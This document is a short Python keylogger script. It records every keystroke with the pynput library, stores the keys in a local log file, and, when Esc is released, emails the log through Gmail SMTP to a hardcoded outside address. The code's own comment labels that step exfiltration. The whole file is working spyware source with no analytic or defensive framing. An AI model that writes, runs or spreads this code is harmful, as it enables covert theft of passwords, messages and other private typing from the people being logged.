#!/usr/bin/python3

import pynput
from pynput import keyboard
import smtplib

#global variables
NB_KEYS_BEFORE_WRITE = 5
keys_list = [] #contains 5 key that will be stored inside a file
previous_key = ""

#email informations
smtp_name = 'smtp.gmail.com'
port = 587
#put your gmail identification here
user = 'youremail@gmail.com'
pwd = 'yourpassword'

#gmail
sender_email = user
receiver_email = 'seedspace6498@gmail.com'

def on_press(key):
	global keys_list, previous_key
	
	#stores the key inside array
	keys_list.append(key)
	previous_key = key
	print('key {0} pressed'.format(str(key)))
	if len(keys_list) == NB_KEYS_BEFORE_WRITE:
		#store to file
		write2file(keys_list)
		print("words wrote to disk")
		keys_list = []

def on_release(key):
	if key == keyboard.Key.esc: # Stop listener
		message = ""
		#read log
		with open("log.txt", "r") as f:
			message = f.read()
		# Send email exfiltration
		try:
			server = smtplib.SMTP(smtp_name, port)
			server.ehlo() #hello serveur
			server.starttls() #encryption
			server.login(user, pwd)
			server.sendmail(sender_email, receiver_email, message)
			print("Email sent successfully")
			server.close()
		except Exception as e:
			print("Someting went wrong : " + str(e))
		
		return False
        
def write2file(keys):
	global previous_key
	with open("log.txt", "a") as f:
		for key in keys:
			processed_key = str(key).replace("'", "")
			if ("space" in processed_key or "enter" in processed_key) and not "space" in str(previous_key):
				f.write("\n")
			elif not "Key" in processed_key:
				f.write(processed_key)

# collects keyboard events
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()
